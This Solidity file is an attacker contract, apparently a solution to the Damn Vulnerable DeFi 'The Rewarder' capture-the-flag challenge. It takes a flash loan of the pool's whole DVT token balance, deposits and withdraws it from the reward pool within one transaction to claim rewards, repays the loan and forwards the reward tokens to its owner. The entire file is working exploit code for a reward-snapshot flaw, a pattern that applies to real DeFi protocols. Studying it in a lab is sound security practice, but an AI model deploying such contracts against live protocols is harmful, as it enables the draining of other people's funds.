// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./FlashLoanerPool.sol";
import "./TheRewarderPool.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";


contract AttackerRewarder is Ownable{
    FlashLoanerPool flashPool;
    TheRewarderPool rewardPool;
    ERC20 DVT_Token;
    ERC20 RewardToken;


    constructor(address _flashPool, address _rewardPool, address _DVT_Token, address _rewardToken){
        flashPool = FlashLoanerPool(_flashPool);
        rewardPool = TheRewarderPool(_rewardPool);
        DVT_Token = ERC20(_DVT_Token);
        RewardToken = ERC20(_rewardToken);
    }



    function callLoan()public onlyOwner{
        uint flashPoolDVTBalance = DVT_Token.balanceOf(address(flashPool));
        flashPool.flashLoan(flashPoolDVTBalance);
    }




    function receiveFlashLoan(uint256 amount)external{
        require(msg.sender == address(flashPool), "Caller is not the FlashLoaner Pool!");
        DVT_Token.approve(address(rewardPool), amount);
        rewardPool.deposit(amount);
        rewardPool.withdraw(amount);
        DVT_Token.transfer(msg.sender, amount);

        uint rewardBalance = RewardToken.balanceOf(address(this));
        RewardToken.transfer(owner(), rewardBalance);
    }



    receive()external payable{}
}